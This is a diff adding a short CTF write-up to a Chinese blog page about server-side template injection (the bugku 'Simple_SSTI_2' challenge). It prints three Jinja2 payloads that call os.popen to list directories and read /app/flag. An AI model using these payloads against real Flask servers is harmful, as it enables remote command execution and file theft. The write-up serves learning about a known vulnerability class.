@@ -75,6 +75,17 @@
 <p>参考文章：</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cioi/p/12308518.html#a5">从零开始的ssti学习（已填） - Cxlover - 博客园 (cnblogs.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Onlyone_1314/article/details/121569766">(40条消息) XCTF-攻防世界CTF平台-Web类——12、Web_python_template_injection（SSTI服务器模板注入、Flask框架之Jinja2模板渲染引擎）_Onlyone_1314的博客-CSDN博客</a></p>
+<h1 id="Simple-SSTI-2-bugku"><a href="#Simple-SSTI-2-bugku" class="headerlink" title="Simple_SSTI_2  bugku"></a>Simple_SSTI_2  bugku</h1><p>第二次做这种题，感觉还是不会做，跟着wp做的</p>
+<p>1.查看上一级所存在的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?flag=&#123;&#123;config.__class__.init__.globals__[&#x27;os&#x27;].popen(&#x27;ls ../&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.查看文件夹中有哪些文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?flag=&#123;&#123;config.__class__.init__.globals__[&#x27;os&#x27;].popen(&#x27;ls /app&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3.查看文件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?flag=&#123;&#123;config.__class__.init__.globals__[&#x27;os&#x27;].popen(&#x27;cat /app/flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有些不理解，先当作常用命令记着吧！！</p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
@@ -110,7 +121,7 @@
     </div>
     
         <div class='side'>
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">SSTI 模板注入漏洞</span></a></li></ol>	
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">SSTI 模板注入漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Simple-SSTI-2-bugku"><span class="toc-number">2.</span> <span class="toc-text">Simple_SSTI_2  bugku</span></a></li></ol>	
         </div>
     
 </div>
